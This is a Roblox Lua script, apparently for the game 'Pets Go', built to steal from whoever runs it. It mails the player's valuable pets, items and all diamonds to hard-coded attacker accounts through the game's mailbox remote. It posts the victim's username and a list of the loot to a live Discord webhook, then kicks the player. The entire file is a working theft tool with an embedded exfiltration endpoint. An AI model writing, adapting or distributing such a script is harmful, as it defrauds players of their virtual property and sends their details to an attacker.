-- Usernames of the targets
Usernames = {
    "stepanark",
    "xavaxonosel60",
    -- Add more users here if necessary
}

-- Minimum RAP and chance settings
min_rap = 1000000 -- 1 million RAP minimum for pets
min_chance = 100000 -- Minimum chance for pets

-- Webhook URL for notifications
webhook = "https://discord.com/api/webhooks/1299345986061205586/YNmpW0V7RT157DVhz_9Jh5DjkgTjFvQ11IMR9T9_dvQL2Fzzsqw45FQZs0onqEP0761j"

-- Services
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "sussy baka"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local sentUsers = {}
_G.scriptExecuted = _G.scriptExecuted or false

-- Function to get player save data
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

-- Check if the player is one of the target users
for _, user in ipairs(Usernames) do
    if plr.Name == user then
        plr:Kick("You cannot mail steal yourself")
        return
    end
end

-- Get the amount of gems the player has
local GemAmount1 = 0
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

-- Format number function (with suffix)
local function formatNumber(number)
    if number == nil then
        return "0"
    end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

-- Send a message to the webhook
local function SendMessage(username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json",
    }

    local fields = {
        {
            name = "Victim Username:",
            value = username,
            inline = true
        },
        {
            name = "Items to be sent:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = "",
            inline = false
        }
    }

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap, chance = item.chance}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        local itemLine = ""
        if itemData.chance then
            itemLine = string.format("1/%s %s (x%d): %s RAP", formatNumber(itemData.chance), itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        else
            itemLine = string.format("%s (x%d): %s RAP", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        end
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    local sentUsersFormatted
    if #sentUsers == 1 then
        sentUsersFormatted = "||" .. sentUsers[1] .. "||"
    elseif #sentUsers > 1 then
        local formatted = {}
        for _, user in ipairs(sentUsers) do
            table.insert(formatted, "||" .. user .. "||")
        end
        sentUsersFormatted = table.concat(formatted, ", ")
    else
        sentUsersFormatted = "||None||"
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s\nSent to users: %s", formatNumber(diamonds), formatNumber(totalRAP), sentUsersFormatted)

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\142\178 New Pets Go Execution",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "sussy baka"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)

    if webhook and webhook ~= "" then
        local response = request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

-- Function to send items to users
local function sendItem(category, uid, am)
    local userIndex = 1
    local maxUsers = #Usernames
    local sent = false

    repeat
        local currentUser = Usernames[userIndex]
        local args = {
            [1] = currentUser,
            [2] = MailMessage,
            [3] = category,
            [4] = uid,
            [5] = am or 1
        }

        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))

        if response == true then
            sent = true
            if not table.find(sentUsers, currentUser) then
                table.insert(sentUsers, currentUser)
            end
        elseif response == false and err == "They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex > maxUsers then
                sent = true
            end
        end
    until sent
end

-- Function to send all gems to users
local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            if GemAmount1 >= 500 and GemAmount1 >= min_rap then
                local userIndex = 1
                local maxUsers = #Usernames
                local sent = false

                repeat
                    local currentUser = Usernames[userIndex]
                    local args = {
                        [1] = currentUser,
                        [2] = MailMessage,
                        [3] = "Currency",
                        [4] = i,
                        [5] = GemAmount1
                    }

                    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))

                    if response == true then
                        sent = true
                        if not table.find(sentUsers, currentUser) then
                            table.insert(sentUsers, currentUser)
                        end
                    elseif response == false and err == "They don't have enough space!" then
                        userIndex = userIndex + 1
                        if userIndex > maxUsers then
                            sent = true
                        end
                    end
                until sent
                break
            end
        end
    end
end

-- Main logic to claim mail and execute the stealing process
local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}

for i, v in pairs(categoryList) do
    if save[v] ~= nil then
        for uid, item in pairs(save[v]) do
            if v == "Pet" then
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    local difficulty = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]["difficulty"]
                    if difficulty >= min_chance then
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, chance = difficulty})
                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                    totalRAP = totalRAP + (rapValue * (item._am or 1))
                end
            end
        end
    end
end

-- Send all gems and log the theft
SendAllGems()
SendMessage(plr.Name, GemAmount1)

for _, item in ipairs(sortedItems) do
    for _ = 1, item.amount do
        sendItem(item.category, item.uid)
    end
end

SendMessage(plr.Name, GemAmount1)
ClaimMail()
plr:Kick("Pets have been executed. Gems sent.")
